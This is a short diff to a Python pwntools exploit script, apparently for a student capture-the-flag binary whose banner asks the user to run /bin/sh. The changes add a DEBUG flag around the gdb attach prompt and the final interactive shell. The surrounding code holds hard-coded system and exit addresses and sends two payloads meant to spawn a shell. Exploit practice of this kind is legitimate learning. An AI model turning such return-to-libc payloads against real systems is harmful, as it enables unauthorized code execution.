@@ -3,6 +3,8 @@
 from pwn import *
 import binascii
 
+DEBUG = True
+
 
 system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
 exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
@@ -38,7 +40,10 @@ f.write(payload1)
 f.close()
 
 p = process("./bin")
-raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")
+
+if DEBUG:
+    raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")
+
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
 p.sendline(payload1)
@@ -88,4 +93,5 @@ payload2 = (
 
 p.sendline(payload2)
 
-p.interactive()
+if DEBUG:
+    p.interactive()
